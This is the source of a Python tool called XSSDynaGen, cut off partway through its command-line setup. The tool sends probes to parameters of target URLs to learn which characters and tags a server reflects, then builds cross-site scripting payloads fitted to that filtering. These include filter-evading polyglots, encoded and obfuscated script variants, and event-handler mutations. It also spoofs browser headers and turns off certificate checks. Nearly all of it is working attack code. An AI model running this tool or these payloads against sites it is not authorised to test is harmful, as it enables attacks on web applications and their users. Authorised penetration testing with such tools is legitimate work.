#!/usr/bin/env python3
"""XSSDynaGen - Dynamic XSS Payload Generator based on server-side character reflection analysis."""

import os
import sys
import re
import json
import time
import random
import string
import asyncio
import logging
import argparse
import warnings
import subprocess
import urllib.parse
from pathlib import Path
from datetime import datetime
from typing import Set, Optional, Tuple, List, Dict, Any
from dataclasses import dataclass, field

import aiohttp
from tqdm import tqdm
from colorama import init as colorama_init, Style, Fore

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

VERSION = "2.0.0"
DEFAULT_MAX_CONNECTIONS = 40
DEFAULT_TIMEOUT = 10
DEFAULT_DELAY = 0
DEFAULT_RETRIES = 2
GITHUB_REPOSITORY: str = "Cybersecurity-Ethical-Hacker/xssdynagen"
GITHUB_URL: str = f"https://github.com/{GITHUB_REPOSITORY}"
MAX_LOG_SIZE = 10 * 1024 * 1024

_color_enabled = True


def C(text: str, color: str) -> str:
    return f"{color}{text}{Style.RESET_ALL}" if _color_enabled else str(text)


class CacheManager:
    """TTL-based cache for reflection test results."""

    def __init__(self, ttl: int = 600):
        self._store: Dict[str, Tuple[bool, float]] = {}
        self._ttl = ttl
        self.hits = 0
        self.misses = 0

    def get(self, key: str) -> Optional[bool]:
        entry = self._store.get(key)
        if entry is not None:
            result, ts = entry
            if time.time() - ts <= self._ttl:
                self.hits += 1
                return result
            del self._store[key]
        self.misses += 1
        return None

    def set(self, key: str, value: bool):
        self._store[key] = (value, time.time())

    @property
    def size(self) -> int:
        return len(self._store)


def filter_urls(urls: List[str]) -> Tuple[List[str], int]:
    """Deduplicate URLs by (base, param-names) pattern; drop URLs without query params."""
    filtered = []
    seen: Set[Tuple[str, frozenset]] = set()
    skipped = 0
    url_re = re.compile(r'^https?://')

    for raw in urls:
        url = raw.strip()
        if not url or not url_re.match(url):
            continue
        try:
            p = urllib.parse.urlparse(url)
            if not p.query:
                skipped += 1
                continue
            base = f"{p.scheme}://{p.netloc}{p.path}"
            params = frozenset(urllib.parse.parse_qs(p.query, keep_blank_values=True))
            key = (base, params)
            if key not in seen:
                seen.add(key)
                filtered.append(url)
        except Exception:
            continue
    return filtered, skipped


def setup_logging(verbose: bool = False):
    log_dir = Path('logs')
    log_dir.mkdir(exist_ok=True)
    log_file = log_dir / 'xssdynagen.log'

    try:
        if log_file.exists() and log_file.stat().st_size > MAX_LOG_SIZE:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_file.rename(log_dir / f'xssdynagen_{ts}.log.bak')
    except OSError:
        pass

    fh = logging.FileHandler(log_file, encoding='utf-8')
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))

    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG if verbose else logging.WARNING)
    ch.setFormatter(logging.Formatter('%(levelname)s: %(message)s'))

    logging.basicConfig(level=logging.DEBUG, handlers=[fh, ch])
    for name in ('aiohttp', 'asyncio'):
        lg = logging.getLogger(name)
        lg.setLevel(logging.WARNING)
        lg.handlers = [fh]
        lg.propagate = False


class CharacterSetLoader:
    DEFAULT_GROUPS = {
        'basic': string.ascii_letters + string.digits,
        'special': '<>()\'"`{}[];/@\\*&^%$#!~:,.-_',
        'spaces': ' \t\n\r',
        'encoded': '%20%0A%0D%3C%3E%22%27%3B%28%29',
        'unicode': '\u0022\u0027\u003C\u003E',
        'null_bytes': '\x00\x0D\x0A',
        'double_encoding': '%253C%253E%2522%2527',
        'html_entities': '&lt;&gt;&quot;&apos;',
        'comments': '<!---->/**/<!--',
        'protocol_handlers': 'javascript:data:vbscript:',
        'event_handlers': 'onmouseover=onload=onerror=onfocus=',
    }

    def __init__(self, file_path: Optional[str] = None):
        self.file_path = file_path

    def load(self) -> Dict[str, str]:
        if not self.file_path:
            return dict(self.DEFAULT_GROUPS)
        try:
            groups: Dict[str, str] = {}
            current: Optional[str] = None
            with open(self.file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if line.startswith('[') and line.endswith(']'):
                        current = line[1:-1].strip().lower()
                        groups.setdefault(current, '')
                        continue
                    if current is not None:
                        existing = set(groups[current])
                        for ch in line:
                            if ch not in existing:
                                groups[current] += ch
                                existing.add(ch)
            return groups if groups else dict(self.DEFAULT_GROUPS)
        except FileNotFoundError:
            logging.warning(f"Character file not found: {self.file_path}, using defaults")
            return dict(self.DEFAULT_GROUPS)
        except Exception as e:
            logging.error(f"Error loading character file: {e}")
            return dict(self.DEFAULT_GROUPS)

    def get_unique_chars(self) -> Set[str]:
        return set(''.join(self.load().values()))


class AutoUpdater:
    """Git-based auto-updater with non-interactive, timeout-guarded subprocess calls."""

    def __init__(self):
        self.repo_path = Path(__file__).parent
        self.is_git_repo = self._probe_git()
        self.branch = self._detect_branch() if self.is_git_repo else None

    def _git(self, args: List[str], timeout: int = 5) -> Optional[str]:
        env = os.environ.copy()
        env.update({"GIT_ASKPASS": "echo", "GIT_TERMINAL_PROMPT": "0"})
        try:
            r = subprocess.run(
                ['git'] + args,
                cwd=self.repo_path,
                capture_output=True,
                text=True,
                timeout=timeout,
                env=env,
            )
            return r.stdout.strip() if r.returncode == 0 else None
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return None

    def _probe_git(self) -> bool:
        return self._git(['rev-parse', '--git-dir']) is not None

    def _detect_branch(self) -> str:
        branch = self._git(['rev-parse', '--abbrev-ref', 'HEAD'])
        return branch if branch and branch != 'HEAD' else 'main'

    def _remote_version(self) -> Optional[str]:
        if self._git(['fetch', '--tags', 'origin'], timeout=10) is None:
            return None
        tag = self._git(['describe', '--tags', '--abbrev=0', f'origin/{self.branch}'])
        return tag.lstrip('v') if tag else None

    def _local_version(self) -> str:
        tag = self._git(['describe', '--tags', '--abbrev=0'])
        return tag.lstrip('v') if tag else VERSION

    @staticmethod
    def _ver_tuple(v: str) -> Tuple[int, ...]:
        try:
            return tuple(int(x) for x in v.split('.'))
        except (ValueError, AttributeError):
            return (0, 0, 0)

    def check(self) -> Dict[str, Any]:
        if not self.is_git_repo:
            return {'current': VERSION, 'update': None, 'message': 'Not a git repository'}
        local = self._local_version()
        remote = self._remote_version()
        if remote is None:
            return {'current': local, 'update': None, 'message': 'Check skipped'}
        if self._ver_tuple(remote) > self._ver_tuple(local):
            return {'current': local, 'update': remote, 'message': f'Update available: {remote}'}
        return {'current': local, 'update': None, 'message': 'Up to date'}

    def apply_update(self) -> Dict[str, Any]:
        if not self.is_git_repo:
            return {'ok': False, 'message': 'Not a git repository'}
        info = self.check()
        if info['update'] is None:
            return {'ok': True, 'message': info['message'], 'version': info['current']}
        if self._git(['reset', '--hard', f'origin/{self.branch}']) is None:
            return {'ok': False, 'message': 'Reset failed'}
        pull = self._git(['pull', '--force', 'origin', self.branch], timeout=30)
        if pull is None:
            return {'ok': False, 'message': 'Pull failed'}
        return {'ok': True, 'message': 'Updated successfully', 'version': info['update']}


@dataclass
class ParamAnalysis:
    param: str
    url: str
    allowed_chars: Set[str] = field(default_factory=set)
    blocked_chars: Set[str] = field(default_factory=set)
    max_length: Optional[int] = None
    allows_spaces: bool = False
    allows_quotes: bool = False
    allows_angles: bool = False
    allows_parens: bool = False
    allows_scripts: bool = False
    allows_events: bool = False


class XSSParamAnalyzer:
    CHROME_VERSIONS = [
        "131.0.6778.204", "130.0.6723.117", "129.0.6668.100",
        "128.0.6613.138", "127.0.6533.120",
    ]
    ACCEPT_LANGUAGES = [
        "en-US,en;q=0.9", "en-GB,en;q=0.9",
        "en-US,en;q=0.9,es;q=0.8", "en-US,en;q=0.9,fr;q=0.8",
    ]

    def __init__(
        self, *,
        max_connections: int = DEFAULT_MAX_CONNECTIONS,
        timeout: int = DEFAULT_TIMEOUT,
        output_file: str = 'xss_payloads_gen',
        headers: Optional[Dict[str, str]] = None,
        char_file: Optional[str] = None,
        proxy: Optional[str] = None,
        delay: int = DEFAULT_DELAY,
        retries: int = DEFAULT_RETRIES,
        verbose: bool = False,
        quiet: bool = False,
    ):
        self.max_connections = max_connections
        self.timeout = timeout
        self.output_file = output_file
        self.custom_headers = headers or {}
        self.proxy = proxy
        self._delay = delay / 1000 if delay > 0 else 0.0
        self.retries = retries
        self.verbose = verbose
        self.quiet = quiet

        self.session: Optional[aiohttp.ClientSession] = None
        self.cache = CacheManager(ttl=600)
        self._rate_sem: Optional[asyncio.Semaphore] = None

        self.char_loader = CharacterSetLoader(char_file)
        self.char_groups = self.char_loader.load()

        self.payloads_dir = Path('payloads')
        self.payloads_dir.mkdir(exist_ok=True)

        self.stats = {'requests': 0, 'failures': 0, 'params_analyzed': 0}

    def _build_headers(self) -> Dict[str, str]:
        cv = random.choice(self.CHROME_VERSIONS)
        major = cv.split('.')[0]
        lang = random.choice(self.ACCEPT_LANGUAGES)
        h = {
            'User-Agent': (
                f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                f'(KHTML, like Gecko) Chrome/{cv} Safari/537.36'
            ),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': lang,
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Sec-Ch-Ua': f'"Chromium";v="{major}", "Google Chrome";v="{major}"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'keep-alive',
            'DNT': '1',
        }
        h.update(self.custom_headers)
        return h

    async def init_session(self):
        connector = aiohttp.TCPConnector(
            limit=self.max_connections,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            ssl=False,
        )
        logging.info("SSL certificate verification is disabled")
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers=self._build_headers(),
            trust_env=True,
        )
        self._rate_sem = asyncio.Semaphore(1 if self._delay > 0 else self.max_connections)

    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()
            await asyncio.sleep(0.25)

    # ── Core reflection testing ──────────────────────────────────────────

    async def _check_reflection(self, url: str, param: str, payload: str) -> bool:
        """Send payload as the value of param (preserving other params) and check verbatim reflection."""
        cache_key = f"{url}|{param}|{payload}"
        cached = self.cache.get(cache_key)
        if cached is not None:
            return cached

        parsed = urllib.parse.urlparse(url)
        original_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        test_params = {k: v[0] for k, v in original_params.items()}
        test_params[param] = payload
        test_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(test_params))
        )

        async with self._rate_sem:
            if self._delay > 0:
                await asyncio.sleep(self._delay)

            for attempt in range(self.retries + 1):
                try:
                    kw: Dict[str, Any] = {}
                    if self.proxy:
                        kw['proxy'] = self.proxy

                    async with self.session.get(test_url, **kw) as resp:
                        self.stats['requests'] += 1
                        if resp.status != 200:
                            self.cache.set(cache_key, False)
                            return False
                        body = await resp.text()
                        result = payload in body
                        self.cache.set(cache_key, result)
                        return result

                except (asyncio.TimeoutError, aiohttp.ClientError) as exc:
                    self.stats['failures'] += 1
                    if attempt < self.retries:
                        await asyncio.sleep(0.5 * (attempt + 1))
                        continue
                    logging.debug(f"Request failed after {self.retries + 1} attempts for param={param}: {exc}")
                    self.cache.set(cache_key, False)
                    return False
                except Exception as exc:
                    self.stats['failures'] += 1
                    logging.debug(f"Unexpected error testing param={param}: {exc}")
                    self.cache.set(cache_key, False)
                    return False

        return False

    async def _test_char(self, url: str, param: str, char: str) -> Tuple[str, bool]:
        """Test whether a single character is reflected raw (unencoded) by sending it tripled."""
        probe = char * 3
        result = await self._check_reflection(url, param, probe)
        return char, result

    # ── High-level analysis methods ──────────────────────────────────────

    async def analyze_chars(self, url: str, param: str, on_progress=None) -> Tuple[Set[str], Set[str]]:
        """Return (allowed_chars, blocked_chars) by testing each char for raw reflection."""
        canary = f"xDyN{''.join(random.choices(string.ascii_lowercase, k=8))}"
        if not await self._check_reflection(url, param, canary):
            logging.info(f"Parameter '{param}' does not reflect input — skipping")
            return set(), set()

        all_chars: Set[str] = set()
        for chars in self.char_groups.values():
            all_chars.update(chars)

        char_list = sorted(all_chars)
        results: Dict[str, bool] = {}
        batch_sz = min(self.max_connections, 50)

        for i in range(0, len(char_list), batch_sz):
            batch = char_list[i:i + batch_sz]
            batch_results = await asyncio.gather(*[
                self._test_char(url, param, c) for c in batch
            ])
            for c, ok in batch_results:
                results[c] = ok
            if on_progress:
                on_progress(len(batch))

        allowed = {c for c, ok in results.items() if ok}
        blocked = {c for c, ok in results.items() if not ok}
        return allowed, blocked

    async def test_script_tags(self, url: str, param: str) -> bool:
        """Test if script-like patterns survive server-side filtering (full payload reflection)."""
        probes = [
            "<script>", "<SCRIPT>", "<ScRiPt>",
            "<%73cript>", "<scr<script>ipt>",
            "<img src=x onerror=", "<svg onload=",
            "<iframe onload=", "<video onloadstart=",
            "<<script>>", "</script>", "<script/>",
        ]
        tasks = [self._check_reflection(url, param, p) for p in probes]
        results = await asyncio.gather(*tasks)
        return any(results)

    async def test_event_handlers(self, url: str, param: str) -> bool:
        """Test if event handler strings survive server-side filtering (full payload reflection)."""
        probes = [
            "onmouseover=", "onclick=", "onerror=", "onload=",
            "onfocus=", "onblur=", "onkeyup=", "onkeydown=",
            "onmouseenter=", "onmouseleave=", "ondblclick=",
            "oncontextmenu=", "onsubmit=", "onchange=",
        ]
        tasks = [self._check_reflection(url, param, p) for p in probes]
        results = await asyncio.gather(*tasks)
        return any(results)

    async def test_max_length(self, url: str, param: str) -> Optional[int]:
        """Binary search for the maximum payload length the server reflects verbatim."""
        if not await self._check_reflection(url, param, 'A' * 10):
            return None
        lo, hi = 10, 5000
        while lo <= hi:
            mid = (lo + hi) // 2
            if await self._check_reflection(url, param, 'A' * mid):
                lo = mid + 1
            else:
                hi = mid - 1
        return hi if hi >= 10 else None

    async def analyze_parameter(self, url: str, param: str, on_progress=None) -> ParamAnalysis:
        """Full analysis of a single parameter's reflection behaviour."""
        if not self.quiet:
            host = urllib.parse.urlparse(url).netloc
            print(f"\r{' ' * 120}\r  {C('>', Fore.YELLOW)} "
                  f"[{C(host, Fore.WHITE)}] Testing parameter: {C(param, Fore.CYAN)}",
                  end='', flush=True)

        allowed, blocked = await self.analyze_chars(url, param, on_progress=on_progress)

        if not allowed:
            self.stats['params_analyzed'] += 1
            return ParamAnalysis(param=param, url=url)

        scripts, events, max_len = await asyncio.gather(
            self.test_script_tags(url, param),
            self.test_event_handlers(url, param),
            self.test_max_length(url, param),
        )
        self.stats['params_analyzed'] += 1

        analysis = ParamAnalysis(
            param=param, url=url,
            allowed_chars=allowed, blocked_chars=blocked,
            max_length=max_len,
            allows_spaces=' ' in allowed,
            allows_quotes='"' in allowed or "'" in allowed,
            allows_angles='<' in allowed and '>' in allowed,
            allows_parens='(' in allowed and ')' in allowed,
            allows_scripts=scripts,
            allows_events=events,
        )

        if self.verbose and not self.quiet:
            payloads_preview = len(self.generate_payloads(analysis))
            print(f"\n    {C('Allowed chars:', Fore.GREEN)} {len(allowed)}  "
                  f"{C('Blocked:', Fore.RED)} {len(blocked)}  "
                  f"{C('Angles:', Fore.CYAN)} {'Y' if analysis.allows_angles else 'N'}  "
                  f"{C('Quotes:', Fore.CYAN)} {'Y' if analysis.allows_quotes else 'N'}  "
                  f"{C('Scripts:', Fore.CYAN)} {'Y' if scripts else 'N'}  "
                  f"{C('Events:', Fore.CYAN)} {'Y' if events else 'N'}  "
                  f"{C('MaxLen:', Fore.CYAN)} {max_len or '?'}  "
                  f"{C('Payloads:', Fore.CYAN)} {payloads_preview}")

        return analysis

    # ── URL parameter extraction ─────────────────────────────────────────

    @staticmethod
    def extract_parameters(url: str) -> Dict[str, Optional[str]]:
        try:
            parsed = urllib.parse.urlparse(url)
            if not parsed.query:
                return {}
            params: Dict[str, Optional[str]] = {}
            for pair in re.split('[&;]', parsed.query):
                if not pair:
                    continue
                if '=' not in pair:
                    params[urllib.parse.unquote(pair)] = None
                else:
                    k, v = pair.split('=', 1)
                    params[urllib.parse.unquote(k)] = urllib.parse.unquote(v) if v else None
            return params
        except Exception as e:
            logging.error(f"Error parsing URL parameters: {e}")
            return {}

    # ── Payload generation ───────────────────────────────────────────────

    @staticmethod
    def get_predefined_payloads(analysis: ParamAnalysis) -> Set[str]:
        payloads: Set[str] = set()
        a = analysis.allowed_chars
        has_eq = '=' in a
        has_slash = '/' in a

        if analysis.allows_angles and analysis.allows_scripts and has_eq and has_slash:
            payloads.update([
                "<script>alert(1)</script>",
                "<script>prompt(1)</script>",
                "<script>confirm(1)</script>",
                "<svg onload=alert(1)>",
                "<svg/onload=prompt()>",
                "<svg/onload=alert&sol;**&sol;(3)>",
                "<svg/onload=alert/*1337*/(1)>",
                "<svg/onload=prompt()>",
                "<svg/onload=alert//&NewLine;(2)>",
                "<svg/onload=alert/&#42;&#42;/(4)>",
                "<svg/onload=alert&#x2F;**&#47;(5)>",
                "<body onload=alert(1)>",
                "<iframe onload=alert(1)>",
            ])
            if analysis.allows_quotes:
                payloads.update([
                    '<script type="text/javascript">javascript:alert(1);</script>',
                    '"><script>prompt()</script>',
                    '"><img src=x onerror=prompt()>',
                    '"><iMg SrC=x onError=prompt()>',
                    '<img src="x" onerror="alert(1)">',
                    "javascript:\"/*'/*`/*--></noscript></title></textarea></style>"
                    "</template></noembed></script><html \" onmouseover="
                    "/*&lt;svg/*/onload=alert()//>",
                    "'\"--></style></script><svg onload=alert(1)//",
                    "\"'--></style></script><img src=x onerror=alert(1)>",
                    "javascript:\"/*'/*`/*--></noscript></title></textarea></style>"
                    "</template></noembed></script><html \" onmouseover=alert(1)//>",
                ])

        if not analysis.allows_angles:
            payloads.update([
                "javascript:alert(1)",
                "&lt;script&gt;alert(1)&lt;/script&gt;",
                "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
                "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
            ])

        if analysis.allows_angles and analysis.allows_quotes:
            payloads.update([
                "<style>@import 'javascript:alert(1)';</style>",
                "<link rel=stylesheet href=javascript:alert(1)>",
                "<div style='background-image: url(javascript:alert(1))'>",
                "<style>*[{}*{background:url(javascript:alert(1))}]{color: red};</style>",
                "<div style=\"background:url(javascript:alert(1))\">",
                '<style>@keyframes x{}</style>'
                '<div style="animation-name:x" onanimationend="alert(1)"></div>',
            ])

        return payloads

    @staticmethod
    def generate_dynamic_payloads(analysis: ParamAnalysis) -> Set[str]:
        dyn: Set[str] = set()
        a = analysis.allowed_chars

        if analysis.allows_angles and '<' in a and '>' in a:
            tags = ['script', 'img', 'svg', 'iframe', 'video', 'audio', 'body']
            events = ['onload', 'onerror', 'onmouseover', 'onclick', 'onmouseenter']
            funcs = ['alert', 'prompt', 'confirm', 'eval', 'atob']
            mutations = {'script': ['ScRiPt'], 'img': ['ImG'], 'svg': ['SvG']}

            for tag in tags:
                if not all(c in a for c in tag):
                    continue
                variants = [tag] + mutations.get(tag, [])
                for t in variants:
                    if not all(c in a for c in t):
                        continue
                    if '*' in a and '/' in a:
                        for fn in funcs:
                            if all(c in a for c in fn):
                                dyn.add(f"<{t}>/**/{fn}(1)/**/")
                                dyn.add(f"<{t}>/*-->{fn}(1)/**/")
                                dyn.add(f"<{t}>//{fn}(1)")
                    if '\x00' in a:
                        for fn in funcs:
                            if all(c in a for c in fn):
                                dyn.add(f"<{tag}\x00>{fn}(1)")
                                dyn.add(f"<{tag}>\x00{fn}(1)")

                if '=' in a:
                    event_mutations = {
                        'onload': ['OnLoad', 'ONLOAD'],
                        'onerror': ['OnError', 'ONERROR'],
                    }
                    for ev in events:
                        if not all(c in a for c in ev):
                            continue
                        ev_variants = [ev] + event_mutations.get(ev, [])
                        for evo in ev_variants:
                            if not all(c in a for c in evo):
                                continue
                            for t in [tag] + mutations.get(tag, []):
                                if not all(c in a for c in t):
                                    continue
                                if analysis.allows_quotes:
                                    dyn.add(f'<{t} data-{evo}="alert(1)">')
                                if ':' in a:
                                    dyn.add(f"<{t} {evo}=javascript:alert(1)>")
                                if '&' in a and ';' in a:
                                    dyn.add(f"<{t} {evo}=&quot;alert(1)&quot;>")

        if analysis.allows_angles and analysis.allows_scripts:
            dom_evasions = [
                "<script>eval(atob(`YWxlcnQoMSk=`))</script>",
                "<script>[].filter.constructor('alert(1)')()</script>",
                "<script>setTimeout`alert\\x28document.domain\\x29`</script>",
                "<script>Object.assign(window,{alert:eval})('1')</script>",
                "<script>new Function\\`alert\\`1\\`\\`</script>",
                "<script>eval.call`${'alert(1)'}`</script>",
            ]
            for ev in dom_evasions:
                if all(c in a for c in ev):
                    dyn.add(ev)

        if all(c in a for c in 'javascript:'):
            proto_evasions = [
                "javascript:void(`alert(1)`)",
                "javascript:(alert)(1)",
                "javascript:new Function\\`alert\\`1\\`\\`",
                "javascript:this",
                "javascript:[][filter][constructor]('alert(1)')()",
                "javascript:alert?.()?.['']",
                "javascript:(?=alert)w=1,alert(w)",
            ]
            for ev in proto_evasions:
                if all(c in a for c in ev):
                    dyn.add(ev)

        return dyn

    def generate_payloads(self, analysis: ParamAnalysis) -> List[str]:
        combined = self.get_predefined_payloads(analysis) | self.generate_dynamic_payloads(analysis)

        if analysis.max_length:
            combined = {p for p in combined if len(p) <= analysis.max_length}

        final = []
        for p in sorted(combined):
            stripped = p.replace('\n', '').replace('\r', '').strip()
            if stripped and not any(c in analysis.blocked_chars for c in stripped):
                final.append(stripped)
        return final

    # ── Full URL analysis ────────────────────────────────────────────────

    async def analyze_url(self, url: str, on_progress=None) -> Dict[str, Any]:
        params = self.extract_parameters(url)
        if not params:
            return {}
        results: Dict[str, Any] = {}
        for param in params:
            analysis = await self.analyze_parameter(url, param, on_progress=on_progress)
            payloads = self.generate_payloads(analysis)
            if payloads:
                results[param] = {'analysis': analysis, 'payloads': payloads}
        return results

    # ── Banner ───────────────────────────────────────────────────────────

    def banner(self, version_info: Dict[str, Any]):
        if self.quiet:
            return
        W = 86
        logo = f"""\
{Fore.RED}██╗  ██╗███████╗███████╗██████╗ ██╗   ██╗███╗   ██╗ █████╗  ██████╗ ███████╗███╗   ██╗
╚██╗██╔╝██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝████╗  ██║██╔══██╗██╔════╝ ██╔════╝████╗  ██║
 ╚███╔╝ ███████╗███████╗██║  ██║ ╚████╔╝ ██╔██╗ ██║███████║██║  ███╗█████╗  ██╔██╗ ██║
 ██╔██╗ ╚════██║╚════██║██║  ██║  ╚██╔╝  ██║╚██╗██║██╔══██║██║   ██║██╔══╝  ██║╚██╗██║
██╔╝ ██╗███████║███████║██████╔╝   ██║   ██║ ╚████║██║  ██║╚██████╔╝███████╗██║ ╚████║
╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝{Style.RESET_ALL}"""
        print(logo)
        print(C("By Dimitris Chatzidimitris".center(W), Fore.RED))
        print(C("Email: dimitris.chatzidimitris@gmail.com".center(W), Fore.RED))
        print(C("Parameter Analysis / Server Characters Allowance / Dynamic Payloads Generation".center(W), Fore.RED))
        print()

        cur = version_info.get('current', VERSION)
        upd = version_info.get('update')
        upd_str = C(upd, Fore.YELLOW) if upd else C('Up to date', Fore.GREEN)

        print(C("Configuration:", Fore.CYAN))
        print(f"  Version        : {C(cur, Fore.YELLOW)}")
        print(f"  Update         : {upd_str}")
        print(f"  Connections    : {C(str(self.max_connections), Fore.CYAN)}")
        print(f"  Timeout        : {C(f'{self.timeout}s', Fore.CYAN)}")
        print(f"  Retries        : {C(str(self.retries), Fore.CYAN)}")
        if self.proxy:
            print(f"  Proxy          : {C(self.proxy, Fore.CYAN)}")
        if self._delay > 0:
            print(f"  Delay          : {C(f'{int(self._delay * 1000)}ms', Fore.CYAN)}")
        print()


# ── Main processing ──────────────────────────────────────────────────────

async def process_urls(analyzer: XSSParamAnalyzer, urls: List[str], *, json_output: bool = False):
    await analyzer.init_session()
    try:
        start = time.time()
        all_results: Dict[str, Dict[str, Any]] = {}
        unique_payloads: Set[str] = set()
        total_params = sum(len(analyzer.extract_parameters(u)) for u in urls)

        if not analyzer.quiet:
            print(C(f"Analyzing {len(urls)} URL(s) with {total_params} parameter(s)...\n", Fore.YELLOW))

        pbar = None
        if not analyzer.quiet:
            pbar = tqdm(
                total=total_params,
                desc="Parameters",
                bar_format="{desc}: {percentage:3.0f}%|{bar}| {n}/{total} [{elapsed}<{remaining}]",
                colour="red",
                dynamic_ncols=True,
            )

        for url in urls:
            url_results: Dict[str, Any] = {}
            params = analyzer.extract_parameters(url)
            for param in params:
                analysis = await analyzer.analyze_parameter(url, param)
                payloads = analyzer.generate_payloads(analysis)
                if payloads:
                    url_results[param] = {'analysis': analysis, 'payloads': payloads}
                    unique_payloads.update(payloads)
                if pbar:
                    pbar.update(1)
                    pbar.set_postfix_str(
                        f"payloads={len(unique_payloads)} "
                        f"reqs={analyzer.stats['requests']}"
                    )
            if url_results:
                all_results[url] = url_results

        if pbar:
            pbar.close()

        elapsed = time.time() - start
        mins, secs = divmod(int(elapsed), 60)

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")

        if json_output:
            out_path = analyzer.payloads_dir / f"{analyzer.output_file}_{ts}.json"
            json_data = {
                'version': VERSION,
                'timestamp': datetime.now().isoformat(),
                'config': {
                    'max_connections': analyzer.max_connections,
                    'timeout': analyzer.timeout,
                    'retries': analyzer.retries,
                    'proxy': analyzer.proxy,
                    'delay_ms': int(analyzer._delay * 1000),
                },
                'results': [],
                'summary': {
                    'urls_processed': len(urls),
                    'total_payloads': sum(
                        len(pr['payloads'])
                        for ur in all_results.values()
                        for pr in ur.values()
                    ),
                    'unique_payloads': len(unique_payloads),
                    'duration_seconds': round(elapsed, 2),
                    'requests_made': analyzer.stats['requests'],
                    'cache_hits': analyzer.cache.hits,
                },
            }
            for url, url_res in all_results.items():
                entry: Dict[str, Any] = {'url': url, 'parameters': []}
                for param_name, data in url_res.items():
                    pa: ParamAnalysis = data['analysis']
                    entry['parameters'].append({
                        'name': pa.param,
                        'allowed_chars': sorted(pa.allowed_chars),
                        'blocked_chars': sorted(pa.blocked_chars),
                        'max_length': pa.max_length,
                        'allows_scripts': pa.allows_scripts,
                        'allows_events': pa.allows_events,
                        'allows_angles': pa.allows_angles,
                        'allows_quotes': pa.allows_quotes,
                        'allows_parens': pa.allows_parens,
                        'allows_spaces': pa.allows_spaces,
                        'payloads': data['payloads'],
                    })
                json_data['results'].append(entry)

            with open(out_path, 'w', encoding='utf-8') as f:
                json.dump(json_data, f, indent=2, ensure_ascii=False)
        else:
            out_path = analyzer.payloads_dir / f"{analyzer.output_file}_{ts}.txt"
            with open(out_path, 'w', encoding='utf-8', buffering=8192) as f:
                for payload in sorted(unique_payloads):
                    f.write(f"{payload}\n")

        if not analyzer.quiet:
            print(f"\n\n{C('Scan Complete — Summary:', Fore.CYAN)}")
            print("=" * 45)
            print(f"  Duration         : {C(f'{mins}m {secs}s', Fore.GREEN)}")
            print(f"  URLs processed   : {C(str(len(urls)), Fore.GREEN)}")
            print(f"  Params analyzed  : {C(str(analyzer.stats['params_analyzed']), Fore.GREEN)}")
            print(f"  Unique payloads  : {C(str(len(unique_payloads)), Fore.GREEN)}")
            print(f"  HTTP requests    : {C(str(analyzer.stats['requests']), Fore.GREEN)}")
            print(f"  Cache hits       : {C(str(analyzer.cache.hits), Fore.GREEN)}")
            print(f"  Failed requests  : {C(str(analyzer.stats['failures']), Fore.YELLOW)}")
            print("=" * 45)
            print(f"  Output: {C(str(out_path.resolve()), Fore.GREEN)}")
            print()

    except asyncio.CancelledError:
        if not analyzer.quiet:
            print(f"\n{C('Scan cancelled.', Fore.YELLOW)}")
    except Exception as exc:
        logging.error(f"Scan error: {exc}", exc_info=True)
        print(f"\n{C(f'Error: {exc}', Fore.RED)}")
    finally:
        await analyzer.close_session()


# ── CLI ──────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog='xssdynagen',
        description='XSSDynaGen — Dynamic XSS payload generator based on server character reflection analysis.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""\
examples:
  %(prog)s -d "https://target.com/page?id=1&name=test"
  %(prog)s -l urls.txt -c 80 -t 15
  %(prog)s -l urls.txt -p http://127.0.0.1:8080 --delay 100
  %(prog)s -l urls.txt --json -o results
  cat urls.txt | %(prog)s -l - -q --json

{GITHUB_URL}""",
    )

    src = p.add_mutually_exclusive_group()
    src.add_argument('-d', '--domain', metavar='URL',
                     help='Single URL with parameter(s) to analyze')
    src.add_argument('-l', '--url-list', metavar='FILE',
                     help='File with URLs (one per line), or "-" for stdin')

    p.add_argument('-o', '--output', default='xss_payloads_gen', metavar='NAME',
                   help='Output file base name (default: xss_payloads_gen)')
    p.add_argument('-c', '--connections', type=int, default=DEFAULT_MAX_CONNECTIONS, metavar='N',
                   help=f'Max concurrent connections (default: {DEFAULT_MAX_CONNECTIONS})')
    p.add_argument('-t', '--timeout', type=int, default=DEFAULT_TIMEOUT, metavar='SEC',
                   help=f'Request timeout in seconds (default: {DEFAULT_TIMEOUT})')
    p.add_argument('-H', '--header', action='append', metavar='"K: V"',
                   help='Custom header (repeatable)')
    p.add_argument('-f', '--char-file', metavar='FILE',
